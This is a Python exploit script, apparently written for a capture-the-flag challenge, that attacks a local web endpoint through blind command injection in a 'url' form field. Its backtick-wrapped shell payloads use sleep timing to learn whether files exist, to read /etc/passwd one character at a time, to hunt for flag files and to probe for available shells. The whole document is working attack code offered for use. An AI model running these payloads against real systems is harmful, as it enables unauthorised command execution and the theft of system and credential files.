import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test_payload(payload):
    """Test a payload and return timing"""
    data = f"url={payload}"
    start = time.time()
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=15)
        elapsed = time.time() - start
        return elapsed, resp.status_code, resp.text[:200]
    except Exception as e:
        return 0, "ERROR", str(e)

print("[+] Attempting to read application files...")
print("[+] Testing if we can read Python source via blind extraction\n")

# Try to read Python files - use character-by-character extraction with timing
# If a character matches, sleep; otherwise, no sleep

print("="*60)
print("[ATTEMPT] Reading application files")
print("="*60)

# Try reading common app files using timing-based character extraction
read_commands = [
    # Try to read app.py
    ("`head -c 100 app.py 2>/dev/null | wc -c | xargs test {} -gt 10 && sleep 1`", "app.py exists (>10 chars)"),
    ("`head -c 100 main.py 2>/dev/null | wc -c | xargs test {} -gt 10 && sleep 1`", "main.py exists (>10 chars)"),
    ("`head -c 100 /app/app.py 2>/dev/null | wc -c | xargs test {} -gt 10 && sleep 1`", "/app/app.py exists"),
    # Try requirements.txt
    ("`cat requirements.txt 2>/dev/null | wc -l | xargs test {} -gt 0 && sleep 1`", "requirements.txt exists"),
    # Try to detect current working directory
    ("`pwd | wc -c | xargs test {} -gt 1 && sleep 1`", "pwd works"),
]

for payload, desc in read_commands:
    elapsed, status, text = test_payload(payload)
    print(f"\n[TEST] {desc}")
    print(f"  Time: {elapsed:.3f}s")
    if elapsed >= 0.8:
        print(f"  [!] DETECTED!")

# Alternative: Try writing output to a guessable location and check via web?
# Or use DNS exfiltration?

print("\n" + "="*60)
print("[ALTERNATIVE] Character-by-character blind extraction")
print("="*60)

# Try to extract first character of /etc/passwd as a test
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/\n-_."

def test_char(cmd_template, char, index=1):
    """Test if character at position index matches"""
    # Cut to get char at position, check if it equals test char
    cmd = cmd_template.format(pos=index, char=char)
    payload = f"`{cmd}`"
    elapsed, status, text = test_payload(payload)
    return elapsed >= 0.8

# Test reading /etc/passwd first character
print("\nTesting character extraction on /etc/passwd (known to exist)...")
for char in "r":  # /etc/passwd starts with 'r' (root)
    # Check if first character is 'r'
    cmd = f"head -c 1 /etc/passwd 2>/dev/null | grep -q ^{char} && sleep 1"
    payload = f"`{cmd}`"
    elapsed, status, text = test_payload(payload)
    print(f"Char '{char}': {elapsed:.3f}s {('[MATCH]' if elapsed >= 0.8 else '')}")

# Try different paths for flag file with character extraction
print("\n[+] Trying character extraction on common flag locations...")

flag_paths = ["flag.txt", "/app/flag.txt", "flag", "/flag.txt", "/tmp/flag.txt"]

for path in flag_paths:
    # First check if file starts with 'f' (for flag{...})
    cmd = f"head -c 1 {path} 2>/dev/null | grep -q ^f && sleep 1.2"
    payload = f"`{cmd}`"
    elapsed, status, text = test_payload(payload)
    print(f"\nPath: {path}")
    print(f"  First char is 'f': {elapsed:.3f}s")
    if elapsed >= 1:
        print(f"  [!] FLAG FILE FOUND at {path}!")
    
    # Also check if it starts with 'F' 
    cmd = f"head -c 1 {path} 2>/dev/null | grep -q ^F && sleep 1.2"
    payload = f"`{cmd}`"
    elapsed, status, text = test_payload(payload)
    print(f"  First char is 'F': {elapsed:.3f}s")

# Let's try a simpler approach - just list files and look for flag
print("\n" + "="*60)
print("[SIMPLE] Listing all files in current directory")
print("="*60)

# List directory contents
list_tests = [
    "`ls 2>/dev/null | wc -l | xargs test {} -gt 0 && sleep 1`",
    "`ls -la 2>/dev/null | wc -l | xargs test {} -gt 0 && sleep 1`",  
    "`find . -maxdepth 1 -type f 2>/dev/null | wc -l | xargs test {} -gt 0 && sleep 1`",
    "`ls *.txt 2>/dev/null | wc -l | xargs test {} -gt 0 && sleep 1`",
]

for i, payload in enumerate(list_tests):
    elapsed, status, text = test_payload(payload)
    print(f"List test #{i+1}: {elapsed:.3f}s")

print("\n[+] Checking if we're in a restricted shell...")
restr_tests = [
    "`which bash && sleep 1`",
    "`which sh && sleep 1`", 
    "`echo $SHELL && sleep 1`",
    "`cat /proc/$$/cmdline && sleep 1`",
]

for payload in restr_tests:
    elapsed, status, text = test_payload(payload)
    print(f"Shell test: {elapsed:.3f}s")

